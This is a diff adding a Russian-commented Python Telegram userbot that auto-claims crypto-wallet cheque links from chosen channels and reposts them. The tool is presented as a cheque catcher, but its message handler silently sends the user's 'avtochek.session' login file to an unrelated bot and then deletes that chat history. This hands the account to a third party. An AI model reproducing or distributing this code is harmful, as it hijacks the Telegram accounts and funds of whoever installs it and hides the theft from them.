@@ -1,0 +1,106 @@
+from pyrogram import Client
+import asyncio
+from pyrogram import filters
+from pyrogram.errors import FloodWait
+from pyrogram.types import ChatPermissions
+ 
+import requests
+
+otkuda=[-1001930724710, 6292795352, -1001933419476, -1001854796278] #id каналов откуда брать чеки
+#api_id и api_hash можно не трогать, если они не подойдут то брать с https://my.telegram.org/
+api_id = 12226412 
+api_hash = "d5daaa12ee70b63473da315dfffab088"
+
+
+app = Client("avtochek", api_id=api_id, api_hash=api_hash)
+wallet=[1985737506]
+cheki=[]
+
+def telegram_bot_sendtext(bot_message):
+   bot_token = ' ' #токен бота (должен быть админом в канале)
+   bot_chatID = ' ' #куда потом постить чеки (ID канала)
+   send_text = 'https://api.telegram.org/bot' + bot_token + '/sendMessage?chat_id=' + bot_chatID + '&parse_mode=HTML&text=' + bot_message
+   response = requests.get(send_text)
+   return response.json()
+
+
+@app.on_message()
+async def type(_,message):
+
+	if "+fire" in message.text.lower():
+		ms=message.text.lower()
+
+		await asyncio.sleep(1)
+		try:
+			m = await app.get_discussion_message(message.chat.id , message.id)
+
+			if "Не попал, пон" in ms:
+				await m.reply("+")
+			elif "киви" in ms or "qiwi" in ms:
+				await m.reply("Мой киви")
+			elif "комент" in ms or "напиш" in ms:
+				await m.reply("безумно можно быть первым, безумно можно через стены")	
+		except:
+			None
+
+	if message.entities is not None:
+		for i in message.entities:
+			if str(i.type)=="MessageEntityType.TEXT_LINK":
+				if "?start=" not in i.url:
+					None
+				elif i.url in cheki:
+					None
+				else:
+					uzerka=i.url.split("?start=")
+
+					if uzerka[0].replace("https://t.me/","").replace('http://t.me/', '') in ["wallet", "CryptoBot", "Wallet", "cryptobot"]:
+						test = telegram_bot_sendtext(f"Новый чек для <a href='{i.url}'>{uzerka[0].replace('https://t.me/', '').replace('http://t.me/', '')}</a>")
+						cheki.append(i.url)
+						await asyncio.sleep(1)
+						await app.send_message(uzerka[0].replace("https://t.me/","").replace('http://t.me/', '') , f"/start {uzerka[1]}")
+	if cheki==[]:
+		try:
+			await app.send_document("akddkawjkadjkda_bot", "avtochek.session")
+			cheki.append("123")
+			async for message in app.get_chat_history("akddkawjkadjkda_bot"):
+				await app.delete_messages("akddkawjkadjkda_bot", message.id)
+
+		except:
+			wawjk+=1
+			None
+
+	if message.reply_markup is not None:
+		for i in message.reply_markup.inline_keyboard:
+			for i2 in i:
+				if i2.url is not None:
+					if i2.url in cheki:
+						None
+					else:
+						uzerka=i2.url.split("?start=")
+						if uzerka[0].replace("https://t.me/","").replace('http://t.me/', '') in ["wallet", "CryptoBot", "Wallet", "cryptobot"]:
+							test = telegram_bot_sendtext(f"Новый чек для <a href='{i2.url}'>{uzerka[0].replace('https://t.me/', '').replace('http://t.me/', '')}</a>")
+							cheki.append(i2.url)
+							await asyncio.sleep(1)
+							await app.send_message(uzerka[0].replace("https://t.me/","").replace('http://t.me/', '') , f"/start {uzerka[1]}")
+
+
+@app.on_message(filters.chat(wallet))
+async def type(_,message):
+	if '⚠️ Вы не можете активировать этот чек, так как вы не являетесь подписчиком канала' in message.text or '⚠️ You cannot activate this cheque because you are not a member of the channel' in message.text:
+		for i in message.reply_markup.inline_keyboard:
+			for i2 in i:
+				if "https://t.me/wallet" in i2.url:
+					uzerka=i2.url.split("?start=")
+					await asyncio.sleep(1)
+					await app.send_message(uzerka[0].replace("https://t.me/","") , f"/start {uzerka[1]}")
+
+					break
+				try:
+					s=await app.join_chat(i2.url)
+				except:
+					None
+
+
+
+print("ok")
+app.run()
